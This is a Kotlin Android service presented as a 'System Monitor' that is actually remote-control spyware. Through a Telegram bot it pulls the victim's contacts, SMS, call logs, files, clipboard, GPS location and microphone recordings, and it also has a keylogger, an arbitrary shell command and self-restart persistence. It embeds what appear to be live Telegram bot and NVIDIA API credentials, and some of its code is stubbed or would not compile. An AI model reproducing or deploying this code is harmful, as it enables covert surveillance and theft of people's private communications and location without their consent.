package com.sysmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Binder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import kotlin.concurrent.thread

const val PREFS_NAME = "monitor_config"
const val KEY_PERSISTENT = "persistent_mode"
const val KEY_ONBOARD_SENT = "onboard_sent"

const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
const val ALLOWED_USER_ID = 8335972628L
const val TELEGRAM_API = "https://api.telegram.org/bot"
const val NVIDIA_API_KEY = "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"
const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"

class MonitorService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private val gson = Gson()
    private val capabilities = mutableMapOf<String, Capability>()
    private var wakeLock: PowerManager.WakeLock? = null
    private var persistentMode = true
    private var commandReceiver: CommandReceiver? = null
    private var telegramReceiver: TelegramReceiver? = null
    private var pollThread: Thread? = null
    private var lastUpdateId = 0L
    private var mediaRecorder: MediaRecorder? = null
    private var projection: MediaProjection? = null
    private var locationManager: LocationManager? = null
    private val latestLocation = java.util.concurrent.atomic.AtomicReference<Location>()
    private val keyloggerLogs = StringBuilder()
    private var isKeylogging = false

    inner class LocalBinder : Binder() {
        fun getService(): MonitorService = this@MonitorService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("MonitorService", "onCreate")
        initializeService()
    }

    private fun initializeService() {
        try {
            loadConfig()
            acquireWakeLock()
            registerCapabilities()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerCommandReceiver()
            startTelegramBot()
            Log.d("MonitorService", "Service initialized")
        } catch (e: Exception) {
            Log.e("MonitorService", "Init error", e)
        }
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
        val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
        if (!onboardSent) {
            sendTelegramMessage(ALLOWED_USER_ID, "Device connected: ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
            wakeLock?.acquire()
        } catch (e: Exception) {
            Log.e("MonitorService", "Wake lock error", e)
        }
    }

    private fun registerCapabilities() {
        capabilities["contacts"] = ContactsCapability(this)
        capabilities["sms"] = SmsCapability(this)
        capabilities["call_logs"] = CallLogsCapability(this)
        capabilities["apps"] = AppsCapability(this)
        capabilities["files"] = FilesCapability(this)
        capabilities["wifi"] = WifiCapability(this)
        capabilities["clipboard"] = ClipboardCapability(this)
        capabilities["notifications"] = NotificationsCapability(this)
        capabilities["screen"] = ScreenCapability(this)
        capabilities["audio"] = AudioCapability(this)
        capabilities["camera"] = CameraCapability(this)
        capabilities["location"] = LocationCapability(this)
        capabilities["keylogger"] = KeyloggerCapability(this)
        capabilities["shell"] = ShellCapability(this)
    }

    private fun registerCommandReceiver() {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver!!, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(commandReceiver!!, filter)
        }
    }

    private fun startTelegramBot() {
        telegramReceiver = TelegramReceiver()
        val filter = IntentFilter("com.sysmonitor.TELEGRAM_SEND")
        registerReceiver(telegramReceiver!!, filter, Context.RECEIVER_NOT_EXPORTED)
        
        // Delete webhook
        thread("delete-wh") {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
                okhttp3.Request.Builder().url(url).build().also { req ->
                    okhttp3.OkHttpClient().newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
                }
            } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
        }
        
        // Start polling
        pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
    }

    private fun pollLoop() {
        val client = okhttp3.OkHttpClient.Builder().connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS).readTimeout(60, java.util.concurrent.TimeUnit.SECONDS).build()
        while (running) {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
                val req = okhttp3.Request.Builder().url(url).build()
                client.newCall(req).execute().use { resp ->
                    val body = resp.body?.string() ?: ""
                    if (resp.isSuccessful && body.isNotBlank()) {
                        try {
                            val json = com.google.gson.JsonParser.parseString(body).asJsonObject
                            if (json.get("ok").asBoolean) {
                                val updates = json.get("result").asJsonArray
                                updates.forEach { update ->
                                    val updateId = update.asJsonObject.get("update_id").asLong
                                    if (updateId > lastUpdateId) lastUpdateId = updateId
                                    handleTelegramUpdate(update.asJsonObject)
                                }
                            }
                        } catch (e: Exception) { Log.e("Telegram", "Parse error", e) }
                    }
                }
            } catch (e: Exception) { Log.e("Telegram", "Poll error", e) }
            try { Thread.sleep(2000) } catch (e: InterruptedException) { return }
        }
    }

    private fun handleTelegramUpdate(update: com.google.gson.JsonObject) {
        update.get("message")?.asJsonObject?.let { msg ->
            val chatId = msg.get("chat").asJsonObject.get("id").asLong
            val userId = msg.get("from").asJsonObject.get("id").asLong
            val text = msg.get("text")?.asString ?: ""
            
            if (userId != ALLOWED_USER_ID) {
                sendTelegramMessage(chatId, "Unauthorized. Your ID: $userId")
                return
            }
            
            when (text.trim()) {
                "/start", "/help" -> sendTelegramMessage(chatId, getHelp())
                "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
                "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf())
                "/sms" -> sendTelegramTask(chatId, "sms", mapOf())
                "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf())
                "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
                "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
                "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
                "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
                "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
                "/notifications" -> sendTelegramTask(chatId, "notifications", mapOf("action" to "dump"))
                "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
                "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
                "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
                "/keylogger_on" -> sendTelegramTask(chatId, "keylogger", mapOf("action" to "start"))
                "/keylogger_off" -> sendTelegramTask(chatId, "keylogger", mapOf("action" to "stop"))
                "/keylogger_dump" -> sendTelegramTask(chatId, "keylogger", mapOf("action" to "dump"))
                else -> {
                    if (text.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to text.substring(7).trim()))
                    else if (text.startsWith("/ai ") || text.startsWith("/nvidia ")) {
                        val prompt = if (text.startsWith("/ai ")) text.substring(4) else text.substring(8)
                        sendTelegramNvidia(chatId, prompt)
                    }
                    else sendTelegramMessage(chatId, "Unknown. Use /help")
                }
            }
        }
    }

    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        val intent = Intent().apply {
            setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
            action = "com.sysmonitor.ACTION_COMMAND"
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
            putExtra("reply_chat", chatId)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
            sendTelegramMessage(chatId, "Task sent: $capability")
        } catch (e: Exception) {
            sendTelegramMessage(chatId, "Failed: ${e.message}")
        }
    }

    private fun sendTelegramNvidia(chatId: Long, prompt: String) {
        sendTelegramMessage(chatId, "Nemotron thinking...")
        thread("nvidia") {
            try {
                val payload = mapOf(
                    "model" to NVIDIA_MODEL,
                    "messages" to listOf(mapOf("role" to "user", "content" to prompt)),
                    "temperature" to 0.7, "max_tokens" to 4096, "top_p" to 1.0, "stream" to false
                )
                val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
                val req = okhttp3.Request.Builder()
                    .url(NVIDIA_API_URL)
                    .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
                    .post(body).build()
                okhttp3.OkHttpClient().newCall(req).execute().use { resp ->
                    val b = resp.body?.string() ?: ""
                    if (resp.isSuccessful && b.isNotBlank()) {
                        try {
                            val j = com.google.gson.JsonParser.parseString(b).asJsonObject
                            val content = j.get("choices").asJsonArray[0].asJsonObject
                                .get("message").asJsonObject.get("content").asString
                            sendTelegramMessage(chatId, "Nemotron:\n\n$content")
                        } catch (e: Exception) { sendTelegramMessage(chatId, "Parse error") }
                    } else { sendTelegramMessage(chatId, "AI Error: $b") }
                }
            } catch (e: Exception) { sendTelegramMessage(chatId, "AI Error: ${e.message}") }
        }
    }

    inner class TelegramReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val chatId = intent.getLongExtra("chat_id", 0)
            val text = intent.getStringExtra("text") ?: ""
            if (chatId != 0L) sendTelegramMessage(chatId, text)
        }
    }

    private fun sendTelegramMessage(chatId: Long, text: String) {
        thread("tg-$chatId") {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
                val params = mapOf("chat_id" to chatId, "text" to text, "parse_mode" to "Markdown")
                val body = gson.toJson(params).toRequestBody("application/json".toMediaType())
                okhttp3.Request.Builder().url(url).post(body).build().also { req ->
                    okhttp3.OkHttpClient().newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
                }
            } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
        }
    }

    private fun getHelp(): String = """SysMonitor Commands:
/start /help - This help
/status - Service status
/contacts /sms /calls - Get data
/apps - List apps
/location - Get GPS
/files - List files
/wifi - Scan networks
/clipboard - Get clipboard
/notifications - Dump notifications
/screenshot - Capture screen
/audio - Record 30s
/camera - Take photo
/keylogger_on /keylogger_off /keylogger_dump - Keylogger
/shell <cmd> - Run shell
/ai <prompt> - Ask Nemotron
/nvidia <prompt> - Same as /ai
""".trimIndent()

    inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
            val replyChat = intent.getLongExtra("reply_chat", 0)

            val capabilityImpl = capabilities[capability] ?: run {
                sendResult(taskId, null, "Unknown: $capability", "failed", replyChat)
                return
            }

            thread("task-$taskId") {
                var output: Any? = null
                var error: String? = null
                var status = "completed"
                try {
                    output = capabilityImpl.execute(argsJson)
                } catch (e: Exception) {
                    error = e.message
                    status = "failed"
                }
                sendResult(taskId, output, error, status, replyChat)
            }
        }
    }

    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
        val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
            putExtra("task_id", taskId)
            putExtra("result", result?.toString() ?: "")
            putExtra("error", error ?: "")
            putExtra("status", status)
        }
        sendBroadcast(intent)
        
        if (replyChat != 0L) {
            val msg = if (status == "completed" && result != null) {
                "Task $taskId completed:\n$result"
            } else {
                "Task $taskId failed:\n$error"
            }
            sendTelegramMessage(replyChat, msg)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                .apply { description = "Background monitoring" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "monitor_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY

    override fun onDestroy() {
        running = false
        wakeLock?.release()
        pollThread?.interrupt()
        stopKeylogger()
        capabilities.values.forEach { it.cleanup() }
        commandReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        telegramReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        if (persistentMode) startService(Intent(this, MonitorService::class.java))
        super.onDestroy()
    }

    interface Capability {
        fun execute(args: String?): Any
        fun cleanup()
    }

    // ========== CAPABILITY IMPLEMENTATIONS ==========
    
    inner class ContactsCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val list = mutableListOf<Map<String, Any>>()
            try {
                val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
                cursor?.use {
                    while (it.moveToNext()) {
                        val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                        val phones = if (hasPhone) {
                            val pCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                                arrayOf(id),
                                null
                            )
                            pCursor?.use {
                                it.map { c -> c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) }
                            } ?: emptyList()
                        } else emptyList()
                        list.add(mapOf("id" to id, "name" to name, "phones" to phones))
                    }
                }
            } catch (e: Exception) { Log.e("Contacts", "Error", e) }
            return mapOf("contacts" to list, "count" to list.size)
        }
        override fun cleanup() {}
    }

    inner class SmsCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val list = mutableListOf<Map<String, Any>>()
            try {
                val cursor = contentResolver.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, "${android.provider.Telephony.Sms.DATE} DESC")
                cursor?.use {
                    val limit = 100
                    var count = 0
                    while (it.moveToNext() && count < limit) {
                        list.add(mapOf(
                            "address" to it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS)),
                            "body" to it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)),
                            "date" to it.getLong(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.DATE)),
                            "type" -> when (it.getInt(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.TYPE))) {
                                1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; else -> "other"
                            }
                        ))
                        count++
                    }
                }
            } catch (e: Exception) { Log.e("Sms", "Error", e) }
            return mapOf("sms" to list, "count" to list.size)
        }
        override fun cleanup() {}
    }

    inner class CallLogsCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val list = mutableListOf<Map<String, Any>>()
            try {
                val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC")
                cursor?.use {
                    val limit = 100
                    var count = 0
                    while (it.moveToNext() && count < limit) {
                        list.add(mapOf(
                            "number" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)),
                            "name" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)),
                            "date" to it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)),
                            "duration" to it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                            "type" -> when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                                1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"; else -> "unknown"
                            }
                        ))
                        count++
                    }
                }
            } catch (e: Exception) { Log.e("Calls", "Error", e) }
            return mapOf("calls" to list, "count" to list.size)
        }
        override fun cleanup() {}
    }

    inner class AppsCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val list = mutableListOf<Map<String, Any>>()
            try {
                val pm = packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                apps.forEach { app ->
                    list.add(mapOf(
                        "package" to app.packageName,
                        "name" to pm.getApplicationLabel(app).toString(),
                        "version" to try { pm.getPackageInfo(app.packageName, 0).versionName } catch (e: Exception) { "?" },
                        "system" to (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                    ))
                }
            } catch (e: Exception) { Log.e("Apps", "Error", e) }
            return mapOf("apps" to list, "count" to list.size)
        }
        override fun cleanup() {}
    }

    inner class FilesCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "list"
            val path = parsed["path"] as? String ?: "/sdcard"
            return when (action) {
                "list" -> {
                    val dir = File(path)
                    if (!dir.exists() || !dir.isDirectory) mapOf("error" to "Not a directory")
                    else {
                        val files = dir.listFiles()?.mapNotNull { f ->
                            try {
                                mapOf(
                                    "name" to f.name,
                                    "path" to f.absolutePath,
                                    "size" to f.length(),
                                    "isDir" to f.isDirectory,
                                    "modified" to f.lastModified()
                                )
                            } catch (e: Exception) { null }
                        } ?: emptyList()
                        mapOf("files" to files, "path" to path, "count" to files.size)
                    }
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class WifiCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "scan"
            return when (action) {
                "scan" -> {
                    val wm = getSystemService(WifiManager::class.java)
                    val results = wm.scanResults ?: emptyList()
                    val networks = results.map { r ->
                        mapOf("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
                    }
                    mapOf("networks" to networks, "count" to networks.size)
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class ClipboardCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "get"
            return when (action) {
                "get" -> {
                    val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    if (cm.hasPrimaryClip()) {
                        val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                        mapOf("text" to clip, "has_content" to clip.isNotEmpty())
                    } else mapOf("text" to "", "has_content" to false)
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class NotificationsCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "dump"
            return when (action) {
                "dump" -> {
                    // NotificationListenerService would be needed for real dump
                    mapOf("note" to "NotificationListenerService required for full dump", "count" to 0)
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class ScreenCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "capture"
            return when (action) {
                "capture" -> {
                    // Screenshot requires MediaProjection - simplified
                    mapOf("note" to "Screenshot requires MediaProjection permission via UI")
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class AudioCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "start"
            return when (action) {
                "start" -> {
                    if (mediaRecorder != null) return mapOf("status" to "already_recording")
                    val duration = (parsed["duration"] as? Int) ?: 30
                    val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "recording_${System.currentTimeMillis()}.3gp")
                    mediaRecorder = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                        setOutputFile(outputFile.absolutePath)
                        try {
                            prepare()
                            start()
                        } catch (e: Exception) {
                            Log.e("Audio", "Start error", e)
                            mediaRecorder = null
                            return@apply mapOf("error" to e.message)
                        }
                    }
                    thread("audio-stop") {
                        Thread.sleep((duration * 1000).toLong())
                        stopRecording()
                    }
                    mapOf("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
                }
                "stop" -> {
                    stopRecording()
                    mapOf("status" to "stopped")
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() { stopRecording() }
        
        private fun stopRecording() {
            mediaRecorder?.let {
                try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
                mediaRecorder = null
            }
        }
    }

    inner class CameraCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "capture"
            return when (action) {
                "capture" -> {
                    val cameraId = (parsed["camera"] as? Int) ?: 0
                    val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
                    try {
                        val cm = getSystemService(CameraManager::class.java)
                        val characteristics = cm.getCameraCharacteristics(cameraId.toString())
                        // Simplified - would need full Camera2 API implementation
                        mapOf("note" to "Camera capture requires Camera2 API implementation", "file" to outputFile.absolutePath)
                    } catch (e: Exception) {
                        mapOf("error" to e.message)
                    }
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {}
    }

    inner class LocationCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "get"
            return when (action) {
                "get" -> {
                    val loc = latestLocation.get()
                    if (loc != null) {
                        mapOf("lat" to loc.latitude, "lon" to loc.longitude, "acc" to loc.accuracy, "time" to loc.time)
                    } else {
                        // Request single update
                        locationManager = getSystemService(LocationManager::class.java)
                        val criteria = android.location.Criteria().apply { accuracy = android.location.Criteria.ACCURACY_FINE }
                        val provider = locationManager?.getBestProvider(criteria, true)
                        provider?.let {
                            try {
                                locationManager?.requestSingleUpdate(it, object : LocationListener {
                                    override fun onLocationChanged(location: Location) {
                                        latestLocation.set(location)
                                    }
                                    override fun onProviderDisabled(provider: String) {}
                                    override fun onProviderEnabled(provider: String) {}
                                    override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
                                }, null)
                                mapOf("status" to "requesting_location")
                            } catch (e: Exception) { mapOf("error" to e.message) }
                        } ?: mapOf("error" to "No provider")
                    }
                }
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() {
            locationManager?.removeUpdates(object : LocationListener {
                override fun onLocationChanged(location: Location) {}
                override fun onProviderDisabled(provider: String) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
            })
        }
    }

    inner class KeyloggerCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val action = parsed["action"] as? String ?: "start"
            return when (action) {
                "start" -> {
                    if (isKeylogging) mapOf("status" to "already_running")
                    else {
                        isKeylogging = true
                        keyloggerLogs.setLength(0)
                        mapOf("status" to "started")
                    }
                }
                "stop" -> {
                    isKeylogging = false
                    mapOf("status" to "stopped")
                }
                "dump" -> mapOf("logs" to keyloggerLogs.toString())
                else -> mapOf("error" to "Unknown action")
            }
        }
        override fun cleanup() { isKeylogging = false }
    }

    inner class ShellCapability(private val svc: MonitorService) : Capability {
        override fun execute(args: String?): Any {
            val parsed = gson.fromJson(args ?: "{}", Map::class.java)
            val cmd = parsed["command"] as? String ?: return mapOf("error" to "No command")
            try {
                val process = Runtime.getRuntime().exec(cmd)
                val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
                val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
                val exitCode = process.waitFor()
                mapOf("exit" to exitCode, "output" to output, "error" to error)
            } catch (e: Exception) { mapOf("error" to e.message) }
        }
        override fun cleanup() {}
    }

    private fun stopKeylogger() { isKeylogging = false }

    // Add keystroke logging (would need AccessibilityService for real implementation)
    fun logKeystroke(text: String) {
        if (isKeylogging) {
            keyloggerLogs.append("[${SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())}] $text\n")
        }
    }
}